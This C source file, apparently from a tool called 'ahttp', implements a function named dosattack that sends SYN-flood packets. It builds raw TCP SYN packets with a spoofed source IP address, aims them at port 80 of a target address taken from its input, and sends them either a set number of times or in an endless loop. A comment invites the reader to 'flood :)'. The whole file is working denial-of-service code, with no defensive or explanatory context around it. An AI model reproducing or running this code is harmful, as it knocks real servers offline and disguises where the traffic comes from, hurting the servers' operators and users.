#include <stdio.h>
// For memset
#include <string.h>
#include <sys/socket.h>
// For exit(0);
#include <stdlib.h>
// For errno - the error number
#include <errno.h>
// Provides declarations for tcp header
#include <netinet/tcp.h>
// Provides declarations for ip header
#include <netinet/ip.h>

// Me add it
#include <netinet/in.h>
#include <arpa/inet.h>

#include "debug.h"
#include "ahttp.h"

struct pseudo_header
{
    // Needed for checksum calculation
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

//int attack(const struct AHTTP_INPUT *ainput)
void dosattack(const struct AHTTP_INPUT *ainput)
{
    struct AHTTP_INPUT *ptmp = (struct AHTTP_INPUT *)ainput;
    int debug_mode = ptmp->DebugMode;

    //Create a raw socke
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[40960];
    char source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    strcpy(source_ip, "192.168.1.254");

    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    // Target
    sin.sin_addr.s_addr = inet_addr(ptmp->IP);
    //sin.sin_addr.s_addr = inet_addr("1.2.3.4");

    // Zero out the buffer
    //memset(datagram, 0, 4096);
    memset(datagram, 0, 4096);

    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    // Id of this packet
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    // Set to 0 before calculating checksum
    iph->check = 0;
    // Spoof the source ip address
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons(3306);
    //tcph->source = htons(1234);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    // First and only tcp segment
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    // maximum allowed window size
    tcph->window = htons(5840);
    // If you set a checksum to zero, your kernel's IP stack
    // Should fill in the correct checksum during transmission
    tcph->check = 0;

    tcph->urg_ptr = 0;
    // Now the IP checksum

    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        debug(debug_mode, 2, "Error setting IP_HDRINCL. Error number: %d - Error message: %s", errno, strerror(errno));
        exit(0);
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        debug(debug_mode, 2, "Error setting SO_REUSEADDR. Error number: %d - Error message: %s", errno, strerror(errno));
        exit(0);
    }

    // Uncommend the loop if you want to flood :)
    //while (1)
    //{
    //Send the packet
    if (ptmp->MaxLoop == -1)
    {
        for (;;)
        {
            if (sendto(
                    socket_fd,               // our socket
                    datagram,                // the buffer containing headers and data
                    iph->tot_len,            // total length of our datagram
                    0,                       // routing flags, normally always 0
                    (struct sockaddr *)&sin, // socket addr, just like in
                    sizeof(sin)) < 0)        // a normal send()
            {
                debug(debug_mode, 2, "Attack send error");
            }
            // Data send successfully
            /*
            else
            {
                debug(debug_mode, 2, "Attack packet end successful");
            }
            */
        }
    }
    else
    {
        int l;
        for (l = 0; l < ptmp->MaxLoop; ++l)
        {
            if (sendto(
                    socket_fd,               // our socket
                    datagram,                // the buffer containing headers and data
                    iph->tot_len,            // total length of our datagram
                    0,                       // routing flags, normally always 0
                    (struct sockaddr *)&sin, // socket addr, just like in
                    sizeof(sin)) < 0)        // a normal send()
            {
                debug(debug_mode, 2, "Attack send error");
            }
            // Data send successfully
            else
            {
                debug(debug_mode, 2, "Attack packet end successful");
            }
        }
    }

    //}

    //return 0;
}